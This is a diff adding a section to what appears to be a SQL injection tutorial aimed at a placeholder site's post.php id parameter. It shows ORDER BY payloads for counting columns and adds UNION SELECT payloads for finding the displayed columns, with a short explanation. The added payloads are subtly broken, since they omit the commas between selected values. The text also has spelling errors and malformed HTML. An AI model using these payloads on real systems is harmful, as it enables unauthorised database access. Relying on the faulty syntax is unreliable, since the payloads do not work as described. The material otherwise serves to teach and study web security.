@@ -40,3 +40,14 @@
     - ...
     - 10:`URL: XYZ.online/post.php?id=1'+ORDER+BY+10+--+-`--> was returned same page.
     - 11:`URL: XYZ.online/post.php?id=1'+ORDER+BY+11+--+-`--> ***was not returned same page.***
+
+    
+### Find visiable columns:
+**To find visiable columns after finding number of columns we use this payload:**
+`***URL: XYZ.online/post.php?id=1'+UNION+SELECT+"STR1"+"STR2"+"STR3"+"STR4"+"STR5"+"STR6"+"STR7"+"STR8"+"STR9"+"STR10"+--+-***`
+**OR**
+`***URL: XYZ.online/post.php?id=1'+UNION+SELECT+1+2+3+4+5+6+7+8+9+10+--+-***`
+
+<p style:text-color="red">There is difference between these two payload, What can be it? So if our columns type will be string, we should use "string" to find visiable columns else use numbers.</p>
+
+  
